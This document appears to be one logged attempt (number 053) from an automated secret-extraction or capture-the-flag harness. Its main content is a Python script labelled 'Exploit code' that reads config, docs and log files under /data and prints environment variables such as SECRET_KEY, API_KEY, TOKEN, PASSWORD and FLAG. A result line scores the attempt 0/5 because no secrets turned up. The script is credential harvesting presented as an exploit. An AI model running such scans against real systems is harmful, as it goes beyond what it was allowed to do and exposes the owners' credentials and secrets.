# Attempt 053 - 2026-06-06T21:55:20.202257+00:00
## Template: F | Score: 0 - ConfigFiles - found config/docs files, no secrets
## Exploit code
```python
# Template F: ConfigFiles - read discovered files

from pathlib import Path

files_to_check = [
    '/data/config.json',
    '/data/current-config.json',
    '/data/sample.txt',
    '/data/docs/api.json',
    '/data/docs/README.md',
    '/data/docs/welcome.txt',
    '/data/i18n/greetings.txt',
    '/data/i18n/translations.json',
    '/data/logs/app.log',
    '/data/logs/events.jsonl',
    '/data/logs/docs-readme.md',
]

print("=== Reading discovered files ===\n")

for f in files_to_check:
    p = Path(f)
    if p.exists():
        print(f"--- {f} ---")
        try:
            content = p.read_text()
            print(content[:800])
        except Exception as e:
            print(f"read error: {type(e).__name__}: {e}")

import os
print("=== Environment Variables ===")
env_keys = ['SECRET', 'SECRET_KEY', 'API_KEY', 'TOKEN', 'PASSWORD', 'FLAG', 'FLAG_VALUE']
for key in env_keys:
    val = os.environ.get(key, 'NOT_FOUND')
    print(f"{key}: {val}")

print("\nFile scan complete")
```

## Result
Context: Config files contain only app metadata, no sensitive data found
Score: 0/5 - ConfigFiles - found config/docs files, no secrets
